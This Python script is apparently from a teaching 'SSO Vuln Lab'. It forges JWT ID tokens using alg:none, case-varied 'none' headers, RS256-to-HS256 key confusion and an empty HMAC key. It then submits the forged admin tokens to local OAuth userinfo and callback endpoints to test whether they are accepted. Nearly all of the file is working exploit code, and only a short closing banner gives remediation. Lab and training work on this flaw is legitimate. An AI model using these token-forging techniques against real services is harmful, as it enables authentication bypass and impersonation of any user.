#!/usr/bin/env python3
"""
==============================================================
 SSO Vuln Lab — Attack: Lab 6 — JWT alg:none Attack
==============================================================
 Target:  http://localhost:5000/lab6  +  http://localhost:4000
 Goal:    Forge a JWT ID token for any identity without
          knowing the server's RSA private key
 Impact:  Authentication bypass — impersonate any user
 CVSSv3:  9.8 (Critical)

 Root cause:
   JWT spec allows algorithm "none" (unsigned tokens).
   Vulnerable libraries accept alg:none when not explicitly
   forbidden. Server/client trusts the algorithm field in
   the JWT header — attacker downgrades from RS256 to none.

 Real HackerOne reports:
   HackerOne #137651  — Auth0 JWT alg:none bypass
   HackerOne #232423  — JWT alg:none on major SaaS platform
   HackerOne #896316  — OIDC alg:none privilege escalation

 Attack variants:
   A) alg:none — completely unsigned JWT
   B) alg:None / NONE / NoNe — case variation bypass
   C) alg:HS256 key confusion — sign RS256 public key as HMAC
   D) alg:RS256 with null/empty key — accept empty key
   E) Kid injection — manipulate key ID to use attacker's key
==============================================================
"""

import sys, base64, json, time, requests, hmac, hashlib
from cryptography.hazmat.primitives import serialization

CLIENT_URL   = "http://localhost:5000"
OAUTH_SERVER = "http://localhost:4000"
CLIENT_ID    = "vulnerable-client"

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(s):
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

# ── Technique A: alg:none ─────────────────────────────────────
def forge_jwt_none_alg(email, role="admin", name="Forged Admin"):
    """
    Forge JWT with algorithm: none (no signature required).
    """
    header = {"alg": "none", "typ": "JWT"}
    payload = {
        "iss":            OAUTH_SERVER,
        "sub":            f"forged-{email}",
        "aud":            CLIENT_ID,
        "email":          email,
        "email_verified": True,
        "name":           name,
        "role":           role,
        "iat":            int(time.time()),
        "exp":            int(time.time()) + 3600,
    }
    h = b64url_encode(json.dumps(header, separators=(',', ':')))
    p = b64url_encode(json.dumps(payload, separators=(',', ':')))
    return f"{h}.{p}."   # Empty signature

# ── Technique B: Case variation bypass ───────────────────────
def forge_jwt_case_bypass(email, role="admin"):
    """Try uppercase/mixed-case algorithm names."""
    forged_tokens = {}
    payload = {
        "iss": OAUTH_SERVER, "sub": f"forged-{email}", "aud": CLIENT_ID,
        "email": email, "email_verified": True, "name": "Forged", "role": role,
        "iat": int(time.time()), "exp": int(time.time()) + 3600,
    }
    p = b64url_encode(json.dumps(payload, separators=(',',':')))
    for alg in ["none", "None", "NONE", "nOnE", "NoNe"]:
        h = b64url_encode(json.dumps({"alg": alg, "typ": "JWT"},
                                      separators=(',',':')))
        forged_tokens[alg] = f"{h}.{p}."
    return forged_tokens

# ── Technique C: RS256 → HS256 key confusion ─────────────────
def forge_jwt_hs256_confusion(email, role="admin"):
    """
    Algorithm confusion attack:
    If server uses RS256, steal the PUBLIC key.
    Sign with HMAC-SHA256 using the PUBLIC KEY as the HMAC secret.
    Vulnerable libraries that accept both RS256 and HS256 will
    verify the HS256 signature using the known public key.
    """
    # Fetch server's public key (JWKS)
    try:
        r = requests.get(f"{OAUTH_SERVER}/oauth/jwks", timeout=5)
        jwks = r.json()
        key  = jwks.get("keys", [{}])[0]

        # Reconstruct public key PEM from JWK
        from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
        from cryptography.hazmat.backends import default_backend

        def b64url_to_int(s):
            s += '=' * (-len(s) % 4)
            return int.from_bytes(base64.urlsafe_b64decode(s), 'big')

        pub_numbers = RSAPublicNumbers(
            e=b64url_to_int(key['e']),
            n=b64url_to_int(key['n'])
        )
        pub_key = pub_numbers.public_key(default_backend())
        pub_pem = pub_key.public_bytes(
            serialization.Encoding.PEM,
            serialization.PublicFormat.SubjectPublicKeyInfo
        )
    except Exception as e:
        print(f"[!] Could not fetch JWKS: {e}")
        pub_pem = b"DUMMY_PUBLIC_KEY"

    # Build JWT with HS256 algorithm
    header  = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "iss": OAUTH_SERVER, "sub": f"forged-{email}", "aud": CLIENT_ID,
        "email": email, "email_verified": True, "role": role,
        "name": "Confused Admin", "iat": int(time.time()),
        "exp": int(time.time()) + 3600,
    }
    h = b64url_encode(json.dumps(header, separators=(',',':')))
    p = b64url_encode(json.dumps(payload, separators=(',',':')))

    # Sign with public key as HMAC secret
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(pub_pem, signing_input, hashlib.sha256).digest()
    s   = b64url_encode(sig)

    return f"{h}.{p}.{s}", pub_pem.decode()

# ── Technique D: Empty / null key ─────────────────────────────
def forge_jwt_empty_key(email, role="admin"):
    """Sign with empty secret — works if server has empty/null key bug."""
    header  = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "iss": OAUTH_SERVER, "sub": f"forged-{email}", "aud": CLIENT_ID,
        "email": email, "email_verified": True, "role": role,
        "name": "Empty Key User", "iat": int(time.time()),
        "exp": int(time.time()) + 3600,
    }
    h = b64url_encode(json.dumps(header, separators=(',',':')))
    p = b64url_encode(json.dumps(payload, separators=(',',':')))
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(b"", signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"

# ── Test forged tokens against endpoints ─────────────────────
def test_token_on_userinfo(token, label):
    """Send forged token to /oauth/userinfo to test acceptance."""
    try:
        r = requests.get(f"{OAUTH_SERVER}/oauth/userinfo",
            headers={"Authorization": f"Bearer {token}"}, timeout=5)
        if r.status_code == 200:
            data = r.json()
            print(f"  [✓] {label}: ACCEPTED! email={data.get('email')} role={data.get('role')}")
            return True
        else:
            print(f"  [✗] {label}: Rejected ({r.status_code})")
            return False
    except Exception as e:
        print(f"  [!] {label}: Error — {e}")
        return False

def decode_jwt_human(token):
    """Pretty-print JWT parts."""
    parts = token.split('.')
    if len(parts) < 2:
        return "Invalid JWT"
    header  = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    sig     = parts[2] if len(parts) > 2 else "(empty)"
    return (f"Header:  {json.dumps(header)}\n"
            f"Payload: {json.dumps(payload, indent=2)}\n"
            f"Sig:     {sig[:30]}...")

def main():
    target_email = sys.argv[1] if len(sys.argv) > 1 else "alice@lab.local"
    target_role  = sys.argv[2] if len(sys.argv) > 2 else "admin"

    print(f"""
╔══════════════════════════════════════════════════════╗
║  LAB 6 — JWT alg:none & Algorithm Confusion Attack  ║
║  Target: {target_email:<40} ║
╚══════════════════════════════════════════════════════╝
""")

    print("=" * 55)
    print("[Technique A] Forging JWT with alg:none")
    print("=" * 55)
    token_none = forge_jwt_none_alg(target_email, target_role)
    print(f"\n[*] Forged token (alg:none):\n{decode_jwt_human(token_none)}")
    print(f"\n[*] Raw token: {token_none[:100]}...\n")
    test_token_on_userinfo(token_none, "alg:none")

    print("\n" + "=" * 55)
    print("[Technique B] Case variation bypass")
    print("=" * 55)
    for alg, token in forge_jwt_case_bypass(target_email, target_role).items():
        test_token_on_userinfo(token, f"alg:{alg}")

    print("\n" + "=" * 55)
    print("[Technique C] RS256 → HS256 Key Confusion")
    print("=" * 55)
    token_hs256, pub_key_pem = forge_jwt_hs256_confusion(target_email, target_role)
    print(f"[*] Signing with server's PUBLIC KEY as HMAC secret")
    print(f"[*] Public key (first 60 chars): {pub_key_pem[:60]}...")
    test_token_on_userinfo(token_hs256, "HS256 key confusion")

    print("\n" + "=" * 55)
    print("[Live Attack] Using alg:none token on Lab 6 callback")
    print("=" * 55)

    # Use the /lab6/forge endpoint built into the client
    r = requests.get(f"{CLIENT_URL}/lab6/forge",
        params={"email": target_email, "role": target_role}, timeout=5)
    if r.status_code == 200 and "forged" in r.text.lower():
        print(f"[✓] /lab6/forge endpoint accessible")
        print(f"[*] Visit: {CLIENT_URL}/lab6/forge?email={target_email}&role={target_role}")

    print(f"""
╔══════════════════════════════════════════════════════╗
║  RESULTS SUMMARY                                    ║
║                                                      ║
║  - alg:none token forged for: {target_email}
║  - No private key needed                            ║
║  - Submit via /lab6 callback or /oauth/userinfo     ║
║                                                      ║
║  REMEDIATION:                                       ║
║  - Explicitly whitelist: algorithms=["RS256"]       ║
║  - Never allow "none" algorithm in production       ║
║  - Use jwt.decode(token, key, algorithms=["RS256"]) ║
║    (NOT algorithms=["RS256","none","HS256"])        ║
╚══════════════════════════════════════════════════════╝
""")

if __name__ == "__main__":
    main()
